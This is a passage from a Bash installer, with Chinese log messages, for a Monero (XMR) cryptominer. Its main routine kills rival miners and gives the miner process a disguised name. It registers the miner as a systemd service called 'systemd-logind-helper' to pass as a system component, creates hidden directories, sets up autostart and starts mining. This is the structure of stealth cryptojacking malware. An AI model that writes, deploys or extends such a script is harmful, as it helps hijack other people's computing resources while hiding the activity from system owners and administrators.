                log_info "当前状态: 运行中 (PID: $pid)"
            else
                log_info "当前状态: 已停止"
            fi
        fi
    else
        if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
            log_info "systemd服务管理命令:"
            log_info "查看状态: sudo systemctl status $SERVICE_NAME"
            log_info "查看日志: sudo journalctl -u $SERVICE_NAME -f"
            log_info "停止挖矿: sudo systemctl stop $SERVICE_NAME"
            log_info "启动挖矿: sudo systemctl start $SERVICE_NAME"
            log_info "重启挖矿: sudo systemctl restart $SERVICE_NAME"
        else
            log_info "用户模式管理命令:"
            log_info "查看状态: $WORK_DIR/status.sh"
            log_info "查看日志: $WORK_DIR/view_logs.sh"
            log_info "停止挖矿: killall $DISGUISE_NAME"
            log_info "启动挖矿: $WORK_DIR/miner.sh --config=$WORK_DIR/config.json"
        fi
    fi
    echo
    log_info "=== 便捷脚本 ==="
    log_info "查看状态: $WORK_DIR/status.sh"
    log_info "查看日志: $WORK_DIR/view_logs.sh"
    log_info "启动脚本: $WORK_DIR/miner.sh"
    log_info "配置文件: $WORK_DIR/config.json"
    log_info "日志文件: $WORK_DIR/miner.log"
}

# 主函数
main() {
    # 检测sudo权限
    check_sudo_permissions
    
    # 检测并终止现有的挖矿进程
    kill_existing_miner
    
    # 获取伪装名称
    DISGUISE_NAME=$(get_disguise_name)
    SERVICE_NAME="systemd-logind-helper"
    
    log_info "进程将伪装为: $DISGUISE_NAME"
    log_info "服务将命名为: $SERVICE_NAME"
    
    # 执行安装步骤
    detect_cpu_info
    detect_system
    set_version
    get_download_url
    create_hidden_dirs
    check_prerequisites
    download_and_install
    create_config
    create_miner_script
    create_log_viewer
    setup_autostart
    start_mining
    show_status
    
    log_info "XMR挖矿脚本安装完成！"
}

# 运行主函数
main "$@"
